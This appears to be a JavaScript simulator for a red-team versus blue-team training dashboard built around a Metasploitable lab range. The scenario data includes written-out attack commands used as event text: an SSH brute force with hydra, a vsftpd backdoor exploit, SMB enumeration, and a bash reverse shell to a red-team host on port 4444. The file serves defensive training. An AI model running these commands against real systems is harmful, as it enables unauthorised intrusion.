import { randomUUID } from "crypto";

const MAX_FEED = 40;
const MAX_TIMELINE = 24;

const RED_SCENARIOS = [
  ["Network port scan", "T1046", "medium", "in_progress", "nmap -sV 192.168.56.101"],
  ["SSH brute force attempt", "T1110", "high", "in_progress", "hydra -l msfadmin -P rockyou.txt ssh://192.168.56.101"],
  ["Exploit vsftpd backdoor", "T1210", "critical", "success", "msf exploit(unix/ftp/vsftpd_234_backdoor)"],
  ["SMB enumeration", "T1135", "medium", "success", "enum4linux -a 192.168.56.101"],
  ["Web directory brute force", "T1083", "low", "in_progress", "gobuster dir -u http://192.168.56.101"],
  ["Reverse shell payload sent", "T1059", "critical", "success", "bash -i >& /dev/tcp/red-team-01/4444"],
  ["Credential spray", "T1110", "high", "failed", "crackmapexec smb 192.168.56.101"],
  ["Post-exploitation whoami", "T1033", "medium", "success", "whoami on compromised session"],
];

const BLUE_SCENARIOS = [
  ["Alert triage started", null, "medium", "in_progress", "Reviewing SIEM notable for SSH failures"],
  ["Acknowledged brute force alert", null, "high", "in_progress", "INC-001 assigned to Blue Analyst"],
  ["Firewall block rule added", "T1562", "high", "success", "iptables -A INPUT -s 192.168.56.102 -j DROP"],
  ["Investigation opened", null, "medium", "in_progress", "Timeline analysis on metasploitable auth.log"],
  ["Escalated to incident commander", null, "high", "in_progress", "Severity raised to High"],
  ["Isolated target from network", "T1562", "critical", "blocked", "VLAN quarantine applied to 192.168.56.101"],
  ["Threat hunt query executed", "T1057", "low", "in_progress", "Search: failed auth + external src"],
  ["Containment playbook step 3", null, "medium", "success", "Disabled vsftpd service on target"],
];

const TARGET_SCENARIOS = [
  ["SSH authentication failure spike", null, "high", "detected", "sshd: Failed password for msfadmin"],
  ["FTP anomalous login", null, "medium", "detected", "vsftpd: OOPS: vsftpd: missing value in config"],
  ["Suspicious outbound connection", null, "critical", "detected", "NEW outbound TCP to 192.168.56.102:4444"],
  ["Samba access from unknown host", null, "medium", "detected", "smbd: connection from red-team-01"],
  ["Web server 404 scan pattern", null, "low", "detected", "apache: GET /admin /phpmyadmin /dvwa"],
  ["New listener on high port", null, "critical", "detected", "netstat: LISTEN 0.0.0.0:6200"],
];

const PHASES = ["Reconnaissance", "Initial Access", "Exploitation", "Post-Exploitation", "Containment"];

function pick(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

export class LiveStore {
  constructor() {
    this.onEvent = null;
    this._started = new Date();
    this._phase = PHASES[0];
    this._tick = 0;
    this._redFeed = [];
    this._blueFeed = [];
    this._targetFeed = [];
    this._urgency = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
    this._redCount = 0;
    this._blueCount = 0;
    this._targetCount = 0;
    this._openIncidents = 2;
    this._timeline = [];
    this._connectors = [
      {
        id: "red-01",
        name: "Red Team VM",
        role: "red",
        hostname: "red-team-01",
        ip: "192.168.56.102",
        status: "connected",
        last_event_at: new Date().toISOString(),
        event_rate_per_min: 0,
        data_types: ["attack", "recon", "exploit"],
      },
      {
        id: "blue-01",
        name: "Blue Team VM",
        role: "blue",
        hostname: "blue-team-01",
        ip: "192.168.56.103",
        status: "connected",
        last_event_at: new Date().toISOString(),
        event_rate_per_min: 0,
        data_types: ["analyst", "response", "detection"],
      },
      {
        id: "target-01",
        name: "Metasploitable",
        role: "target",
        hostname: "metasploitable",
        ip: "192.168.56.101",
        status: "connected",
        last_event_at: new Date().toISOString(),
        event_rate_per_min: 0,
        data_types: ["auth", "syslog", "service"],
      },
    ];
    this._asset = {
      hostname: "metasploitable",
      ip: "192.168.56.101",
      risk_level: "high",
      alerts_open: 4,
      services_at_risk: ["ssh", "ftp", "smb", "http"],
      contained: false,
    };
    this._initTimeline();
  }

  _initTimeline() {
    const now = Date.now();
    for (let i = 0; i < MAX_TIMELINE; i++) {
      const t = new Date(now - (MAX_TIMELINE - i) * 5 * 60000);
      this._timeline.push({
        time: t.toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: false }),
        red: Math.max(0, 2 + (i % 5) - 2),
        blue: Math.max(0, 1 + (i % 4) - 1),
        target: Math.max(0, 3 + (i % 6) - 2),
      });
    }
  }

  async publishEvent(raw) {
    const event = {
      id: randomUUID().slice(0, 8),
      timestamp: new Date().toISOString(),
      team: raw.team,
      actor: raw.actor,
      action: raw.action,
      target: raw.target || "metasploitable (192.168.56.101)",
      severity: raw.severity || "medium",
      outcome: raw.outcome || "in_progress",
      mitre_id: raw.mitre_id ?? null,
      related_incident_id: raw.related_incident_id ?? null,
      source_host: raw.source_host,
      message: raw.message,
    };

    this._urgency[event.severity] = (this._urgency[event.severity] || 0) + 1;

    if (event.team === "red") {
      this._redFeed.unshift(event);
      this._redCount++;
      if (this._redFeed.length > MAX_FEED) this._redFeed.pop();
    } else if (event.team === "blue") {
      this._blueFeed.unshift(event);
      this._blueCount++;
      if (this._blueFeed.length > MAX_FEED) this._blueFeed.pop();
    } else {
      this._targetFeed.unshift(event);
      this._targetCount++;
      if (this._targetFeed.length > MAX_FEED) this._targetFeed.pop();
    }

    this._bumpTimeline(event.team);
    this._updateConnectors(event);
    this._updateAsset(event);

    if (this.onEvent) await this.onEvent(event);
    return event;
  }

  _bumpTimeline(team) {
    const last = this._timeline[this._timeline.length - 1] || { red: 0, blue: 0, target: 0 };
    const point = {
      time: new Date().toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: false }),
      red: last.red + (team === "red" ? 1 : 0),
      blue: last.blue + (team === "blue" ? 1 : 0),
      target: last.target + (team === "target" ? 1 : 0),
    };
    if (this._timeline.length >= MAX_TIMELINE) this._timeline.shift();
    this._timeline.push(point);
  }

  _updateConnectors(event) {
    const map = { red: "red-01", blue: "blue-01", target: "target-01" };
    const id = map[event.team] || "target-01";
    for (const c of this._connectors) {
      if (c.id === id) {
        c.last_event_at = event.timestamp;
        c.event_rate_per_min = Math.min(120, c.event_rate_per_min + 0.35);
        c.status = "connected";
      }
    }
  }

  _updateAsset(event) {
    if (event.team === "red" && event.outcome === "success") {
      this._asset.alerts_open = Math.min(99, this._asset.alerts_open + 1);
      const levels = ["low", "medium", "high", "critical"];
      const idx = levels.indexOf(this._asset.risk_level);
      if (idx < 3) this._asset.risk_level = levels[idx + 1];
    }
    if (event.team === "blue" && (event.outcome === "blocked" || event.outcome === "success")) {
      this._asset.alerts_open = Math.max(0, this._asset.alerts_open - 1);
      if (event.action.toLowerCase().includes("isolate")) {
        this._asset.contained = true;
        this._asset.risk_level = "medium";
      }
    }
  }

  setPhase(phase) {
    this._phase = phase;
  }

  getState() {
    const elapsed = Math.floor((Date.now() - this._started.getTime()) / 1000);
    return {
      exercise: {
        name: "Red vs Blue — Metasploitable Range",
        phase: this._phase,
        started_at: this._started.toISOString(),
        red_operator: "Red Operator",
        blue_operator: "Blue Analyst",
        elapsed_seconds: elapsed,
      },
      kpis: {
        red_actions_24h: this._redCount,
        blue_actions_24h: this._blueCount,
        target_alerts: this._targetCount,
        open_incidents: this._openIncidents,
        red_delta: Math.min(this._redCount, 12),
        blue_delta: Math.min(this._blueCount, 8),
        target_delta: Math.min(this._targetCount, 15),
      },
      asset: this._asset,
      urgency: [
        { urgency: "critical", count: this._urgency.critical || 0 },
        { urgency: "high", count: this._urgency.high || 0 },
        { urgency: "medium", count: this._urgency.medium || 0 },
        { urgency: "low", count: this._urgency.low || 0 },
      ],
      timeline: this._timeline,
      red_feed: this._redFeed,
      blue_feed: this._blueFeed,
      target_feed: this._targetFeed,
      connectors: this._connectors,
      connector_summary: {
        onboarded: 3,
        connected: this._connectors.filter((c) => c.status === "connected").length,
        updates: 0,
      },
    };
  }
}

export class ExerciseSimulator {
  constructor(store, intervalSec = 3.5) {
    this.store = store;
    this.intervalSec = intervalSec;
    this._timer = null;
    this._tick = 0;
  }

  start() {
    const tick = async () => {
      this._tick++;
      if (this._tick % 12 === 0) {
        const idx = Math.min(PHASES.length - 1, Math.floor(this._tick / 12));
        this.store.setPhase(PHASES[idx]);
      }
      const roll = Math.random();
      if (roll < 0.42) await this._emitRed();
      else if (roll < 0.78) await this._emitBlue();
      else await this._emitTarget();
    };
    tick();
    this._timer = setInterval(tick, this.intervalSec * 1000);
  }

  async _emitRed() {
    const [action, mitre, severity, outcome, message] = pick(RED_SCENARIOS);
    await this.store.publishEvent({
      team: "red",
      actor: "Red Operator",
      action,
      target: "metasploitable (192.168.56.101)",
      severity,
      outcome,
      mitre_id: mitre,
      source_host: "red-team-01",
      message,
    });
  }

  async _emitBlue() {
    const [action, mitre, severity, outcome, message] = pick(BLUE_SCENARIOS);
    await this.store.publishEvent({
      team: "blue",
      actor: "Blue Analyst",
      action,
      target: "metasploitable (192.168.56.101)",
      severity,
      outcome,
      mitre_id: mitre,
      source_host: "blue-team-01",
      message,
    });
  }

  async _emitTarget() {
    const [action, mitre, severity, outcome, message] = pick(TARGET_SCENARIOS);
    await this.store.publishEvent({
      team: "target",
      actor: "metasploitable",
      action,
      target: "metasploitable (192.168.56.101)",
      severity,
      outcome,
      mitre_id: mitre,
      source_host: "metasploitable",
      message,
    });
  }
}
